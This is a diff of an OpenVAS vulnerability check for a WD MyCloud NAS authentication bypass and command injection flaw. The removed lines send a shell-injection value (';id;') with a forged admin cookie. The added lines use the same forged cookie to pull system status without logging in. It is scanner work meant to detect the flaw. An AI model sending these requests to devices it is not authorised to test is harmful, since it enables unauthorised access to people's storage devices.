@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wd_mycloud_auth_bypass.nasl 11547 2018-09-22 11:35:51Z cfischer $
+# $Id: gb_wd_mycloud_auth_bypass.nasl 11628 2018-09-26 16:59:12Z cfischer $
 #
 # WD MyCloud Products Authentication Bypass and Remote Command Injection Vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:western_digital:mycloud_nas";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.108305");
-  script_version("$Revision: 11547 $");
+  script_version("$Revision: 11628 $");
   script_cve_id("CVE-2018-17153");
   script_bugtraq_id(105359);
-  script_tag(name:"last_modification", value:"$Date: 2018-09-22 13:35:51 +0200 (Sat, 22 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-26 18:59:12 +0200 (Wed, 26 Sep 2018) $");
   script_tag(name:"creation_date", value:"2017-11-30 08:00:00 +0100 (Thu, 30 Nov 2017)");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
@@ -41,7 +41,6 @@ if(description)
   script_copyright("Copyright (c) 2017 Greenbone Networks GmbH");
   script_family("Web application abuses");
   script_dependencies("gb_wd_mycloud_web_detect.nasl");
-  script_require_ports("Services/www", 80);
   script_mandatory_keys("WD-MyCloud/www/detected");
 
   script_xref(name:"URL", value:"https://support.wdc.com/downloads.aspx?lang=en#firmware");
@@ -83,9 +82,11 @@ url = dir + "/cgi-bin/network_mgr.cgi?cmd=cgi_get_ipv6&flag=1";
 req = http_get( port:port, item:url );
 res = http_keepalive_send_recv( port:port, data:req );
 
-# This is just a still existing RCE not fixed
-url2 = dir + "/web/dsdk/DsdkProxy.php";
-data = "';id;'";
+# now we're able to access the system information without a previous login as long as the
+# "admin" user is a valid / existing account.
+# nb: This file / cgi is available on e.g a MyCloud Mirror 2.11.x or MyCloud EX4100 2.30.x
+url2 = dir + "/cgi-bin/home_mgr.cgi";
+data = "cmd=2";
 cookie = "isAdmin=1;username=admin";
 
 req2 = http_post_req( port:port, url:url2, data:data,
@@ -93,9 +94,8 @@ req2 = http_post_req( port:port, url:url2, data:data,
                       add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded", "Cookie", cookie ) );
 res2 = http_keepalive_send_recv( port:port, data:req2, bodyonly:FALSE );
 
-if( res2 =~ "HTTP/1\.[01] 200" && res2 =~ "uid=[0-9]+.*gid=[0-9]+" ) {
-
-  uid = eregmatch( pattern:"(uid=[0-9]+.*gid=[0-9]+[^ ]+)", string:res2 );
+# nb: The device will response with a "HTTP/1.1 404 not found" if access to the home_mgr.cgi was denied.
+if( res2 =~ "^HTTP/1\.[01] 200" && "<config>" >< res2 && res2 =~ "<(board_temperature|fan|hd_status|disk|raid|raidmode)>.*</(board_temperature|fan|hd_status|disk|raid|raidmode)>" ) {
 
   info['"HTTP POST" body'] = data;
   info['Cookie'] = cookie;
@@ -106,10 +106,10 @@ if( res2 =~ "HTTP/1\.[01] 200" && res2 =~ "uid=[0-9]+.*gid=[0-9]+" ) {
   report += '\n\nit was possible to bypass the authententication of the remote device.\n\n';
   report += 'With a follow-up request:\n\n';
   report += text_format_table( array:info ) + '\n';
-  report += 'it was possible to execute the "id" command.';
-  report += '\n\nResult: ' + uid[1];
+  report += 'it was possible to access the system status without a previous valid login.';
+  report += '\n\nResult: ' + res2;
 
-  expert_info  = 'Request 1:\n'+ req + '\nResponse 1:\n' + res;
+  expert_info  = 'Request 1:\n'+ req + '\nResponse 1 (404 HTTP status code is expected):\n' + res;
   expert_info += 'Request 2:\n'+ req2 + '\n\nResponse 2:\n' + res2;
   security_message( port:port, data:report, expert_info:expert_info );
   exit( 0 );
